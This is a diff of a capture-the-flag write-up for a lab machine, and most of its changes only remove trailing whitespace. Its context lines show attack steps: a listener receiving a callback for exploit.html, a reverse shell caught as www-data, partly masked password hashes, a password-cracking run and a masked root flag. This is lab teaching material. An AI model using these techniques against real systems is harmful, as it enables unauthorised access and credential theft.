@@ -34,9 +34,9 @@ kali@kali:cat /etc/hosts
 127.0.0.1       localhost
 127.0.1.1       kali.kali       kali
 
-# The following lines are desirable for IPv6 capable hosts                                                                                         
-::1     localhost ip6-localhost ip6-loopback                                                                                                       
-ff02::1 ip6-allnodes                                                                                                                               
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
 ff02::2 ip6-allrouterso
 ```
 
@@ -73,7 +73,7 @@ gitea                   [Status: 200, Size: 13498, Words: 1049, Lines: 245, Dura
 We get 2 hits. Let's add portal.guardian.htb and gitea.guardian.htb on our hosts file.
 
 ```bash
-kali@kali:cat /etc/hosts                                                                                                                                  
+kali@kali:cat /etc/hosts
 10.129.237.248  guardian.htb portal.guardian.htb gitea.guardian.htb
 
 127.0.0.1       localhost
@@ -487,7 +487,7 @@ So, we create a basic html file, with our own username, password, etc. and provi
 Setup a listener on your machine.
 
 ```bash
-kali@kali:python3 -m http.server 80                                                                                                                       
+kali@kali:python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
@@ -495,7 +495,7 @@ Submit the notice request, you will get message that it will be approved by admi
 After sometime, we receive a connection on our listener.
 
 ```bash
-kali@kali:python3 -m http.server 80                                                                                                                       
+kali@kali:python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.129.237.248 - - [05/Feb/2026 12:29:11] "GET /exploit.html HTTP/1.1" 200 -
 ```
@@ -661,7 +661,7 @@ kali@kali:penelope -p 4444
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
 [+] Logging to /home/kali/.penelope/sessions/guardian~10.129.237.248-Linux-x86_64/2026_02_05-12_52_45-763.log 📜
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 www-data@guardian:~/portal.guardian.htb/admin$ 
 ```
 
@@ -716,8 +716,7 @@ So, only users root, jamil, mark, gitea and Sammy has bash. We will only try to 
 
 So, we have password for 3 users.
 
-```bash
-cat pass.txt                                                                                                                                    
+```credentials
 jamil.enockson:c1d8dfaeee103d01.....f09a0f02ff4f9a43ee440250
 mark.pargetter:8623e713bb98.....bc4c9ee4ba1cc6f37f97a10e
 sammy.treat:c7ea20ae5d78.....503b93379ba7a0d1c2
@@ -752,7 +751,7 @@ with open(HASH_FILE, "r") as f:
 Let's run the script and see how it goes.
 
 ```bash
-kali@kali:python3 crack.py                                                                                                                                
+kali@kali:python3 crack.py
 [+] Found password for jamil.enockson: cop.....56
 [-] Password for mark.pargetter not found
 [-] Password for sammy.treat not found
@@ -987,4 +986,5 @@ Let's conclude this very long challenge by reading the final flag at root direct
 bash-5.1# cat root.txt
 72.....52
 ```
+
 
